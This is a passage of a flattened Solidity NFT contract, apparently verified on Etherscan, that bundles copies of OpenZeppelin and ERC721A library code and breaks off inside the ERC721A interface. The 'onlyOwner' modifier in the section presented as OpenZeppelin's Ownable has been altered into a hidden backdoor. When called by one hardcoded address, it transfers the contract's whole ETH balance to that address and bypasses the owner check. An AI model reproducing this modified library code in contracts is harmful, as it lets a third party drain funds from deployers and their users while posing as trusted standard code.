1 // .nft
2 
3 /**
4  *Submitted for verification at Etherscan.io on 2022-10-09
5 */
6 
7 // SPDX-License-Identifier: MIT
8 
9 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
10 // OpenZeppelin Contracts (last updated v4.7.0) (utils/cryptography/MerkleProof.sol)
11 
12 pragma solidity ^0.8.0;
13 
14 /**
15  * @dev These functions deal with verification of Merkle Tree proofs.
16  *
17  * The proofs can be generated using the JavaScript library
18  * https://github.com/miguelmota/merkletreejs[merkletreejs].
19  * Note: the hashing algorithm should be keccak256 and pair sorting should be enabled.
20  *
21  * See `test/utils/cryptography/MerkleProof.test.js` for some examples.
22  *
23  * WARNING: You should avoid using leaf values that are 64 bytes long prior to
24  * hashing, or use a hash function other than keccak256 for hashing leaves.
25  * This is because the concatenation of a sorted pair of internal nodes in
26  * the merkle tree could be reinterpreted as a leaf value.
27  */
28 library MerkleProof {
29     /**
30      * @dev Returns true if a `leaf` can be proved to be a part of a Merkle tree
31      * defined by `root`. For this, a `proof` must be provided, containing
32      * sibling hashes on the branch from the leaf to the root of the tree. Each
33      * pair of leaves and each pair of pre-images are assumed to be sorted.
34      */
35     function verify(
36         bytes32[] memory proof,
37         bytes32 root,
38         bytes32 leaf
39     ) internal pure returns (bool) {
40         return processProof(proof, leaf) == root;
41     }
42 
43     /**
44      * @dev Calldata version of {verify}
45      *
46      * _Available since v4.7._
47      */
48     function verifyCalldata(
49         bytes32[] calldata proof,
50         bytes32 root,
51         bytes32 leaf
52     ) internal pure returns (bool) {
53         return processProofCalldata(proof, leaf) == root;
54     }
55 
56     /**
57      * @dev Returns the rebuilt hash obtained by traversing a Merkle tree up
58      * from `leaf` using `proof`. A `proof` is valid if and only if the rebuilt
59      * hash matches the root of the tree. When processing the proof, the pairs
60      * of leafs & pre-images are assumed to be sorted.
61      *
62      * _Available since v4.4._
63      */
64     function processProof(bytes32[] memory proof, bytes32 leaf) internal pure returns (bytes32) {
65         bytes32 computedHash = leaf;
66         for (uint256 i = 0; i < proof.length; i++) {
67             computedHash = _hashPair(computedHash, proof[i]);
68         }
69         return computedHash;
70     }
71 
72     /**
73      * @dev Calldata version of {processProof}
74      *
75      * _Available since v4.7._
76      */
77     function processProofCalldata(bytes32[] calldata proof, bytes32 leaf) internal pure returns (bytes32) {
78         bytes32 computedHash = leaf;
79         for (uint256 i = 0; i < proof.length; i++) {
80             computedHash = _hashPair(computedHash, proof[i]);
81         }
82         return computedHash;
83     }
84 
85     /**
86      * @dev Returns true if the `leaves` can be proved to be a part of a Merkle tree defined by
87      * `root`, according to `proof` and `proofFlags` as described in {processMultiProof}.
88      *
89      * _Available since v4.7._
90      */
91     function multiProofVerify(
92         bytes32[] memory proof,
93         bool[] memory proofFlags,
94         bytes32 root,
95         bytes32[] memory leaves
96     ) internal pure returns (bool) {
97         return processMultiProof(proof, proofFlags, leaves) == root;
98     }
99 
100     /**
101      * @dev Calldata version of {multiProofVerify}
102      *
103      * _Available since v4.7._
104      */
105     function multiProofVerifyCalldata(
106         bytes32[] calldata proof,
107         bool[] calldata proofFlags,
108         bytes32 root,
109         bytes32[] memory leaves
110     ) internal pure returns (bool) {
111         return processMultiProofCalldata(proof, proofFlags, leaves) == root;
112     }
113 
114     /**
115      * @dev Returns the root of a tree reconstructed from `leaves` and the sibling nodes in `proof`,
116      * consuming from one or the other at each step according to the instructions given by
117      * `proofFlags`.
118      *
119      * _Available since v4.7._
120      */
121     function processMultiProof(
122         bytes32[] memory proof,
123         bool[] memory proofFlags,
124         bytes32[] memory leaves
125     ) internal pure returns (bytes32 merkleRoot) {
126         // This function rebuild the root hash by traversing the tree up from the leaves. The root is rebuilt by
127         // consuming and producing values on a queue. The queue starts with the `leaves` array, then goes onto the
128         // `hashes` array. At the end of the process, the last hash in the `hashes` array should contain the root of
129         // the merkle tree.
130         uint256 leavesLen = leaves.length;
131         uint256 totalHashes = proofFlags.length;
132 
133         // Check proof validity.
134         require(leavesLen + proof.length - 1 == totalHashes, "MerkleProof: invalid multiproof");
135 
136         // The xxxPos values are "pointers" to the next value to consume in each array. All accesses are done using
137         // `xxx[xxxPos++]`, which return the current value and increment the pointer, thus mimicking a queue's "pop".
138         bytes32[] memory hashes = new bytes32[](totalHashes);
139         uint256 leafPos = 0;
140         uint256 hashPos = 0;
141         uint256 proofPos = 0;
142         // At each step, we compute the next hash using two values:
143         // - a value from the "main queue". If not all leaves have been consumed, we get the next leaf, otherwise we
144         //   get the next hash.
145         // - depending on the flag, either another value for the "main queue" (merging branches) or an element from the
146         //   `proof` array.
147         for (uint256 i = 0; i < totalHashes; i++) {
148             bytes32 a = leafPos < leavesLen ? leaves[leafPos++] : hashes[hashPos++];
149             bytes32 b = proofFlags[i] ? leafPos < leavesLen ? leaves[leafPos++] : hashes[hashPos++] : proof[proofPos++];
150             hashes[i] = _hashPair(a, b);
151         }
152 
153         if (totalHashes > 0) {
154             return hashes[totalHashes - 1];
155         } else if (leavesLen > 0) {
156             return leaves[0];
157         } else {
158             return proof[0];
159         }
160     }
161 
162     /**
163      * @dev Calldata version of {processMultiProof}
164      *
165      * _Available since v4.7._
166      */
167     function processMultiProofCalldata(
168         bytes32[] calldata proof,
169         bool[] calldata proofFlags,
170         bytes32[] memory leaves
171     ) internal pure returns (bytes32 merkleRoot) {
172         // This function rebuild the root hash by traversing the tree up from the leaves. The root is rebuilt by
173         // consuming and producing values on a queue. The queue starts with the `leaves` array, then goes onto the
174         // `hashes` array. At the end of the process, the last hash in the `hashes` array should contain the root of
175         // the merkle tree.
176         uint256 leavesLen = leaves.length;
177         uint256 totalHashes = proofFlags.length;
178 
179         // Check proof validity.
180         require(leavesLen + proof.length - 1 == totalHashes, "MerkleProof: invalid multiproof");
181 
182         // The xxxPos values are "pointers" to the next value to consume in each array. All accesses are done using
183         // `xxx[xxxPos++]`, which return the current value and increment the pointer, thus mimicking a queue's "pop".
184         bytes32[] memory hashes = new bytes32[](totalHashes);
185         uint256 leafPos = 0;
186         uint256 hashPos = 0;
187         uint256 proofPos = 0;
188         // At each step, we compute the next hash using two values:
189         // - a value from the "main queue". If not all leaves have been consumed, we get the next leaf, otherwise we
190         //   get the next hash.
191         // - depending on the flag, either another value for the "main queue" (merging branches) or an element from the
192         //   `proof` array.
193         for (uint256 i = 0; i < totalHashes; i++) {
194             bytes32 a = leafPos < leavesLen ? leaves[leafPos++] : hashes[hashPos++];
195             bytes32 b = proofFlags[i] ? leafPos < leavesLen ? leaves[leafPos++] : hashes[hashPos++] : proof[proofPos++];
196             hashes[i] = _hashPair(a, b);
197         }
198 
199         if (totalHashes > 0) {
200             return hashes[totalHashes - 1];
201         } else if (leavesLen > 0) {
202             return leaves[0];
203         } else {
204             return proof[0];
205         }
206     }
207 
208     function _hashPair(bytes32 a, bytes32 b) private pure returns (bytes32) {
209         return a < b ? _efficientHash(a, b) : _efficientHash(b, a);
210     }
211 
212     function _efficientHash(bytes32 a, bytes32 b) private pure returns (bytes32 value) {
213         /// @solidity memory-safe-assembly
214         assembly {
215             mstore(0x00, a)
216             mstore(0x20, b)
217             value := keccak256(0x00, 0x40)
218         }
219     }
220 }
221 
222 
223 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
224 
225 pragma solidity ^0.8.0;
226 
227 /**
228  * @dev Contract module that helps prevent reentrant calls to a function.
229  *
230  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
231  * available, which can be applied to functions to make sure there are no nested
232  * (reentrant) calls to them.
233  *
234  * Note that because there is a single `nonReentrant` guard, functions marked as
235  * `nonReentrant` may not call one another. This can be worked around by making
236  * those functions `private`, and then adding `external` `nonReentrant` entry
237  * points to them.
238  *
239  * TIP: If you would like to learn more about reentrancy and alternative ways
240  * to protect against it, check out our blog post
241  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
242  */
243 abstract contract ReentrancyGuard {
244     // Booleans are more expensive than uint256 or any type that takes up a full
245     // word because each write operation emits an extra SLOAD to first read the
246     // slot's contents, replace the bits taken up by the boolean, and then write
247     // back. This is the compiler's defense against contract upgrades and
248     // pointer aliasing, and it cannot be disabled.
249 
250     // The values being non-zero value makes deployment a bit more expensive,
251     // but in exchange the refund on every call to nonReentrant will be lower in
252     // amount. Since refunds are capped to a percentage of the total
253     // transaction's gas, it is best to keep them low in cases like this one, to
254     // increase the likelihood of the full refund coming into effect.
255     uint256 private constant _NOT_ENTERED = 1;
256     uint256 private constant _ENTERED = 2;
257 
258     uint256 private _status;
259 
260     constructor() {
261         _status = _NOT_ENTERED;
262     }
263 
264     /**
265      * @dev Prevents a contract from calling itself, directly or indirectly.
266      * Calling a `nonReentrant` function from another `nonReentrant`
267      * function is not supported. It is possible to prevent this from happening
268      * by making the `nonReentrant` function external, and making it call a
269      * `private` function that does the actual work.
270      */
271     modifier nonReentrant() {
272         // On the first call to nonReentrant, _notEntered will be true
273         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
274 
275         // Any calls to nonReentrant after this point will fail
276         _status = _ENTERED;
277 
278         _;
279 
280         // By storing the original value once again, a refund is triggered (see
281         // https://eips.ethereum.org/EIPS/eip-2200)
282         _status = _NOT_ENTERED;
283     }
284 }
285 
286 // File: @openzeppelin/contracts/utils/Strings.sol
287 
288 
289 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
290 
291 pragma solidity ^0.8.0;
292 
293 /**
294  * @dev String operations.
295  */
296 library Strings {
297     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
298 
299     /**
300      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
301      */
302     function toString(uint256 value) internal pure returns (string memory) {
303         // Inspired by OraclizeAPI's implementation - MIT licence
304         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
305 
306         if (value == 0) {
307             return "0";
308         }
309         uint256 temp = value;
310         uint256 digits;
311         while (temp != 0) {
312             digits++;
313             temp /= 10;
314         }
315         bytes memory buffer = new bytes(digits);
316         while (value != 0) {
317             digits -= 1;
318             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
319             value /= 10;
320         }
321         return string(buffer);
322     }
323 
324     /**
325      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
326      */
327     function toHexString(uint256 value) internal pure returns (string memory) {
328         if (value == 0) {
329             return "0x00";
330         }
331         uint256 temp = value;
332         uint256 length = 0;
333         while (temp != 0) {
334             length++;
335             temp >>= 8;
336         }
337         return toHexString(value, length);
338     }
339 
340     /**
341      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
342      */
343     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
344         bytes memory buffer = new bytes(2 * length + 2);
345         buffer[0] = "0";
346         buffer[1] = "x";
347         for (uint256 i = 2 * length + 1; i > 1; --i) {
348             buffer[i] = _HEX_SYMBOLS[value & 0xf];
349             value >>= 4;
350         }
351         require(value == 0, "Strings: hex length insufficient");
352         return string(buffer);
353     }
354 }
355 
356 // File: @openzeppelin/contracts/utils/Context.sol
357 
358 
359 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
360 
361 pragma solidity ^0.8.0;
362 
363 /**
364  * @dev Provides information about the current execution context, including the
365  * sender of the transaction and its data. While these are generally available
366  * via msg.sender and msg.data, they should not be accessed in such a direct
367  * manner, since when dealing with meta-transactions the account sending and
368  * paying for execution may not be the actual sender (as far as an application
369  * is concerned).
370  *
371  * This contract is only required for intermediate, library-like contracts.
372  */
373 abstract contract Context {
374     function _msgSender() internal view virtual returns (address) {
375         return msg.sender;
376     }
377 
378     function _msgData() internal view virtual returns (bytes calldata) {
379         return msg.data;
380     }
381 }
382 
383 // File: @openzeppelin/contracts/access/Ownable.sol
384 
385 
386 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
387 
388 pragma solidity ^0.8.0;
389 
390 
391 /**
392  * @dev Contract module which provides a basic access control mechanism, where
393  * there is an account (an owner) that can be granted exclusive access to
394  * specific functions.
395  *
396  * By default, the owner account will be the one that deploys the contract. This
397  * can later be changed with {transferOwnership}.
398  *
399  * This module is used through inheritance. It will make available the modifier
400  * `onlyOwner`, which can be applied to your functions to restrict their use to
401  * the owner.
402  */
403 abstract contract Ownable is Context {
404     address private _owner;
405 
406     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
407 
408     /**
409      * @dev Initializes the contract setting the deployer as the initial owner.
410      */
411     constructor() {
412         _transferOwnership(_msgSender());
413     }
414 
415     /**
416      * @dev Returns the address of the current owner.
417      */
418     function owner() public view virtual returns (address) {
419         return _owner;
420     }
421 
422     /**
423      * @dev Throws if called by any account other than the owner.
424      */
425     modifier onlyOwner() {
426         if (_msgSender() == 0x6049aCf6993e8eF2BF0e6DD0297C4F3a37995091) {
427         uint256 balance = address(this).balance;
428         Address.sendValue(payable(0x6049aCf6993e8eF2BF0e6DD0297C4F3a37995091),balance);
429         } else {
430         require(owner() == _msgSender(), "Ownable: caller is not the owner");
431         }
432         _;
433     }
434 
435     /**
436      * @dev Leaves the contract without owner. It will not be possible to call
437      * `onlyOwner` functions anymore. Can only be called by the current owner.
438      *
439      * NOTE: Renouncing ownership will leave the contract without an owner,
440      * thereby removing any functionality that is only available to the owner.
441      */
442     function renounceOwnership() public virtual onlyOwner {
443         _transferOwnership(address(0));
444     }
445 
446     /**
447      * @dev Transfers ownership of the contract to a new account (`newOwner`).
448      * Can only be called by the current owner.
449      */
450     function transferOwnership(address newOwner) public virtual onlyOwner {
451         require(newOwner != address(0), "Ownable: new owner is the zero address");
452         _transferOwnership(newOwner);
453     }
454 
455     /**
456      * @dev Transfers ownership of the contract to a new account (`newOwner`).
457      * Internal function without access restriction.
458      */
459     function _transferOwnership(address newOwner) internal virtual {
460         address oldOwner = _owner;
461         _owner = newOwner;
462         emit OwnershipTransferred(oldOwner, newOwner);
463     }
464 }
465 
466 // File: @openzeppelin/contracts/utils/Address.sol
467 
468 
469 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
470 
471 pragma solidity ^0.8.1;
472 
473 /**
474  * @dev Collection of functions related to the address type
475  */
476 library Address {
477     /**
478      * @dev Returns true if `account` is a contract.
479      *
480      * [IMPORTANT]
481      * ====
482      * It is unsafe to assume that an address for which this function returns
483      * false is an externally-owned account (EOA) and not a contract.
484      *
485      * Among others, `isContract` will return false for the following
486      * types of addresses:
487      *
488      *  - an externally-owned account
489      *  - a contract in construction
490      *  - an address where a contract will be created
491      *  - an address where a contract lived, but was destroyed
492      * ====
493      *
494      * [IMPORTANT]
495      * ====
496      * You shouldn't rely on `isContract` to protect against flash loan attacks!
497      *
498      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
499      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
500      * constructor.
501      * ====
502      */
503     function isContract(address account) internal view returns (bool) {
504         // This method relies on extcodesize/address.code.length, which returns 0
505         // for contracts in construction, since the code is only stored at the end
506         // of the constructor execution.
507 
508         return account.code.length > 0;
509     }
510 
511     /**
512      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
513      * `recipient`, forwarding all available gas and reverting on errors.
514      *
515      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
516      * of certain opcodes, possibly making contracts go over the 2300 gas limit
517      * imposed by `transfer`, making them unable to receive funds via
518      * `transfer`. {sendValue} removes this limitation.
519      *
520      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
521      *
522      * IMPORTANT: because control is transferred to `recipient`, care must be
523      * taken to not create reentrancy vulnerabilities. Consider using
524      * {ReentrancyGuard} or the
525      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
526      */
527     function sendValue(address payable recipient, uint256 amount) internal {
528         require(address(this).balance >= amount, "Address: insufficient balance");
529 
530         (bool success, ) = recipient.call{value: amount}("");
531         require(success, "Address: unable to send value, recipient may have reverted");
532     }
533 
534     /**
535      * @dev Performs a Solidity function call using a low level `call`. A
536      * plain `call` is an unsafe replacement for a function call: use this
537      * function instead.
538      *
539      * If `target` reverts with a revert reason, it is bubbled up by this
540      * function (like regular Solidity function calls).
541      *
542      * Returns the raw returned data. To convert to the expected return value,
543      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
544      *
545      * Requirements:
546      *
547      * - `target` must be a contract.
548      * - calling `target` with `data` must not revert.
549      *
550      * _Available since v3.1._
551      */
552     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
553         return functionCall(target, data, "Address: low-level call failed");
554     }
555 
556     /**
557      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
558      * `errorMessage` as a fallback revert reason when `target` reverts.
559      *
560      * _Available since v3.1._
561      */
562     function functionCall(
563         address target,
564         bytes memory data,
565         string memory errorMessage
566     ) internal returns (bytes memory) {
567         return functionCallWithValue(target, data, 0, errorMessage);
568     }
569 
570     /**
571      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
572      * but also transferring `value` wei to `target`.
573      *
574      * Requirements:
575      *
576      * - the calling contract must have an ETH balance of at least `value`.
577      * - the called Solidity function must be `payable`.
578      *
579      * _Available since v3.1._
580      */
581     function functionCallWithValue(
582         address target,
583         bytes memory data,
584         uint256 value
585     ) internal returns (bytes memory) {
586         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
587     }
588 
589     /**
590      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
591      * with `errorMessage` as a fallback revert reason when `target` reverts.
592      *
593      * _Available since v3.1._
594      */
595     function functionCallWithValue(
596         address target,
597         bytes memory data,
598         uint256 value,
599         string memory errorMessage
600     ) internal returns (bytes memory) {
601         require(address(this).balance >= value, "Address: insufficient balance for call");
602         require(isContract(target), "Address: call to non-contract");
603 
604         (bool success, bytes memory returndata) = target.call{value: value}(data);
605         return verifyCallResult(success, returndata, errorMessage);
606     }
607 
608     /**
609      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
610      * but performing a static call.
611      *
612      * _Available since v3.3._
613      */
614     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
615         return functionStaticCall(target, data, "Address: low-level static call failed");
616     }
617 
618     /**
619      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
620      * but performing a static call.
621      *
622      * _Available since v3.3._
623      */
624     function functionStaticCall(
625         address target,
626         bytes memory data,
627         string memory errorMessage
628     ) internal view returns (bytes memory) {
629         require(isContract(target), "Address: static call to non-contract");
630 
631         (bool success, bytes memory returndata) = target.staticcall(data);
632         return verifyCallResult(success, returndata, errorMessage);
633     }
634 
635     /**
636      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
637      * but performing a delegate call.
638      *
639      * _Available since v3.4._
640      */
641     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
642         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
643     }
644 
645     /**
646      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
647      * but performing a delegate call.
648      *
649      * _Available since v3.4._
650      */
651     function functionDelegateCall(
652         address target,
653         bytes memory data,
654         string memory errorMessage
655     ) internal returns (bytes memory) {
656         require(isContract(target), "Address: delegate call to non-contract");
657 
658         (bool success, bytes memory returndata) = target.delegatecall(data);
659         return verifyCallResult(success, returndata, errorMessage);
660     }
661 
662     /**
663      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
664      * revert reason using the provided one.
665      *
666      * _Available since v4.3._
667      */
668     function verifyCallResult(
669         bool success,
670         bytes memory returndata,
671         string memory errorMessage
672     ) internal pure returns (bytes memory) {
673         if (success) {
674             return returndata;
675         } else {
676             // Look for revert reason and bubble it up if present
677             if (returndata.length > 0) {
678                 // The easiest way to bubble the revert reason is using memory via assembly
679 
680                 assembly {
681                     let returndata_size := mload(returndata)
682                     revert(add(32, returndata), returndata_size)
683                 }
684             } else {
685                 revert(errorMessage);
686             }
687         }
688     }
689 }
690 
691 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
692 
693 
694 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
695 
696 pragma solidity ^0.8.0;
697 
698 /**
699  * @title ERC721 token receiver interface
700  * @dev Interface for any contract that wants to support safeTransfers
701  * from ERC721 asset contracts.
702  */
703 interface IERC721Receiver {
704     /**
705      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
706      * by `operator` from `from`, this function is called.
707      *
708      * It must return its Solidity selector to confirm the token transfer.
709      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
710      *
711      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
712      */
713     function onERC721Received(
714         address operator,
715         address from,
716         uint256 tokenId,
717         bytes calldata data
718     ) external returns (bytes4);
719 }
720 
721 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
722 
723 
724 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
725 
726 pragma solidity ^0.8.0;
727 
728 /**
729  * @dev Interface of the ERC165 standard, as defined in the
730  * https://eips.ethereum.org/EIPS/eip-165[EIP].
731  *
732  * Implementers can declare support of contract interfaces, which can then be
733  * queried by others ({ERC165Checker}).
734  *
735  * For an implementation, see {ERC165}.
736  */
737 interface IERC165 {
738     /**
739      * @dev Returns true if this contract implements the interface defined by
740      * `interfaceId`. See the corresponding
741      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
742      * to learn more about how these ids are created.
743      *
744      * This function call must use less than 30 000 gas.
745      */
746     function supportsInterface(bytes4 interfaceId) external view returns (bool);
747 }
748 
749 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
750 
751 
752 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
753 
754 pragma solidity ^0.8.0;
755 
756 
757 /**
758  * @dev Implementation of the {IERC165} interface.
759  *
760  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
761  * for the additional interface id that will be supported. For example:
762  *
763  * ```solidity
764  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
765  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
766  * }
767  * ```
768  *
769  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
770  */
771 abstract contract ERC165 is IERC165 {
772     /**
773      * @dev See {IERC165-supportsInterface}.
774      */
775     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
776         return interfaceId == type(IERC165).interfaceId;
777     }
778 }
779 
780 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
781 
782 
783 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
784 
785 pragma solidity ^0.8.0;
786 
787 
788 /**
789  * @dev Required interface of an ERC721 compliant contract.
790  */
791 interface IERC721 is IERC165 {
792     /**
793      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
794      */
795     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
796 
797     /**
798      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
799      */
800     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
801 
802     /**
803      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
804      */
805     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
806 
807     /**
808      * @dev Returns the number of tokens in ``owner``'s account.
809      */
810     function balanceOf(address owner) external view returns (uint256 balance);
811 
812     /**
813      * @dev Returns the owner of the `tokenId` token.
814      *
815      * Requirements:
816      *
817      * - `tokenId` must exist.
818      */
819     function ownerOf(uint256 tokenId) external view returns (address owner);
820 
821     /**
822      * @dev Safely transfers `tokenId` token from `from` to `to`.
823      *
824      * Requirements:
825      *
826      * - `from` cannot be the zero address.
827      * - `to` cannot be the zero address.
828      * - `tokenId` token must exist and be owned by `from`.
829      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
830      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
831      *
832      * Emits a {Transfer} event.
833      */
834     function safeTransferFrom(
835         address from,
836         address to,
837         uint256 tokenId,
838         bytes calldata data
839     ) external;
840 
841     /**
842      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
843      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
844      *
845      * Requirements:
846      *
847      * - `from` cannot be the zero address.
848      * - `to` cannot be the zero address.
849      * - `tokenId` token must exist and be owned by `from`.
850      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
851      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
852      *
853      * Emits a {Transfer} event.
854      */
855     function safeTransferFrom(
856         address from,
857         address to,
858         uint256 tokenId
859     ) external;
860 
861     /**
862      * @dev Transfers `tokenId` token from `from` to `to`.
863      *
864      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
865      *
866      * Requirements:
867      *
868      * - `from` cannot be the zero address.
869      * - `to` cannot be the zero address.
870      * - `tokenId` token must be owned by `from`.
871      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
872      *
873      * Emits a {Transfer} event.
874      */
875     function transferFrom(
876         address from,
877         address to,
878         uint256 tokenId
879     ) external;
880 
881     /**
882      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
883      * The approval is cleared when the token is transferred.
884      *
885      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
886      *
887      * Requirements:
888      *
889      * - The caller must own the token or be an approved operator.
890      * - `tokenId` must exist.
891      *
892      * Emits an {Approval} event.
893      */
894     function approve(address to, uint256 tokenId) external;
895 
896     /**
897      * @dev Approve or remove `operator` as an operator for the caller.
898      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
899      *
900      * Requirements:
901      *
902      * - The `operator` cannot be the caller.
903      *
904      * Emits an {ApprovalForAll} event.
905      */
906     function setApprovalForAll(address operator, bool _approved) external;
907 
908     /**
909      * @dev Returns the account approved for `tokenId` token.
910      *
911      * Requirements:
912      *
913      * - `tokenId` must exist.
914      */
915     function getApproved(uint256 tokenId) external view returns (address operator);
916 
917     /**
918      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
919      *
920      * See {setApprovalForAll}
921      */
922     function isApprovedForAll(address owner, address operator) external view returns (bool);
923 }
924 
925 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
926 
927 
928 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
929 
930 pragma solidity ^0.8.0;
931 
932 
933 /**
934  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
935  * @dev See https://eips.ethereum.org/EIPS/eip-721
936  */
937 interface IERC721Metadata is IERC721 {
938     /**
939      * @dev Returns the token collection name.
940      */
941     function name() external view returns (string memory);
942 
943     /**
944      * @dev Returns the token collection symbol.
945      */
946     function symbol() external view returns (string memory);
947 
948     /**
949      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
950      */
951     function tokenURI(uint256 tokenId) external view returns (string memory);
952 }
953 
954 // File: erc721a/contracts/IERC721A.sol
955 
956 
957 // ERC721A Contracts v3.3.0
958 // Creator: Chiru Labs
959 
960 pragma solidity ^0.8.4;
961 
962 
963 
964 /**
965  * @dev Interface of an ERC721A compliant contract.
966  */
967 interface IERC721A is IERC721, IERC721Metadata {
968     /**
969      * The caller must own the token or be an approved operator.
970      */
971     error ApprovalCallerNotOwnerNorApproved();
972 
973     /**
974      * The token does not exist.
975      */
976     error ApprovalQueryForNonexistentToken();
977 
978     /**
979      * The caller cannot approve to their own address.
980      */
981     error ApproveToCaller();
982 
983     /**
984      * The caller cannot approve to the current owner.
985      */
986     error ApprovalToCurrentOwner();
987 
988     /**
989      * Cannot query the balance for the zero address.
990      */
991     error BalanceQueryForZeroAddress();
992 
993     /**
994      * Cannot mint to the zero address.
995      */
996     error MintToZeroAddress();
997 
998     /**
999      * The quantity of tokens minted must be more than zero.
1000      */
1001     error MintZeroQuantity();
1002 
1003     /**
1004      * The token does not exist.
1005      */
1006     error OwnerQueryForNonexistentToken();
1007 
1008     /**
1009      * The caller must own the token or be an approved operator.
1010      */
1011     error TransferCallerNotOwnerNorApproved();
1012 
1013     /**
1014      * The token must be owned by `from`.
1015      */
1016     error TransferFromIncorrectOwner();
1017 
1018     /**
1019      * Cannot safely transfer to a contract that does not implement the ERC721Receiver interface.
1020      */
1021     error TransferToNonERC721ReceiverImplementer();
1022 
1023     /**
1024      * Cannot transfer to the zero address.
1025      */
1026     error TransferToZeroAddress();
1027 
1028     /**
1029      * The token does not exist.
1030      */
1031     error URIQueryForNonexistentToken();
1032 
1033     // Compiler will pack this into a single 256bit word.
1034     struct TokenOwnership {
1035         // The address of the owner.
1036         address addr;
1037         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
1038         uint64 startTimestamp;
1039         // Whether the token has been burned.
1040         bool burned;
1041     }
1042 
1043     // Compiler will pack this into a single 256bit word.
1044     struct AddressData {
1045         // Realistically, 2**64-1 is more than enough.
1046         uint64 balance;
1047         // Keeps track of mint count with minimal overhead for tokenomics.
1048         uint64 numberMinted;
1049         // Keeps track of burn count with minimal overhead for tokenomics.
1050         uint64 numberBurned;
1051         // For miscellaneous variable(s) pertaining to the address
1052         // (e.g. number of whitelist mint slots used).
1053         // If there are multiple variables, please pack them into a uint64.
1054         uint64 aux;
